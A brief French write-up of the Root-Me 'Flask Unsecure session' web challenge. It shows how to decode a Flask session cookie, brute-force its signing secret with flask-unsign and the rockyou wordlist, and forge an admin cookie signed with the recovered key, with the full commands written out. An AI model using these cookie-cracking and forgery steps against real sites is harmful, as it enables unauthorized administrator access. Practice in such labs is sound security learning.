Le challenge https://www.root-me.org/fr/Challenges/Web-Serveur/Flask-Unsecure-session


Exploit sur flask 

D'abord quésako ? 

flask est un framework qui permet de faire des sites en python 

Le cookie par défaut est session 
grace à ça on peut décoder
https://www.kirsle.net/wizards/flask-session.cgi

Maintenant on va utiliser unsign 
pip3 install flask-unsign


On va brute force notre cookie 
 flask-unsign --wordlist rockyou.txt --unsign --cookie 'eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.aFxxNQ.I-ZNlMtcgkFW8taLeTn2WSxCMSg' --no-literal-eval

 On va trouver un mdp 

 On pourra générer notre propre cookie 
 flask-unsign --sign --cookie "{'admin':'true','username':'admin'}" --secret "b's3cr3t'"

 On remplace le cookie et pouf le flag 

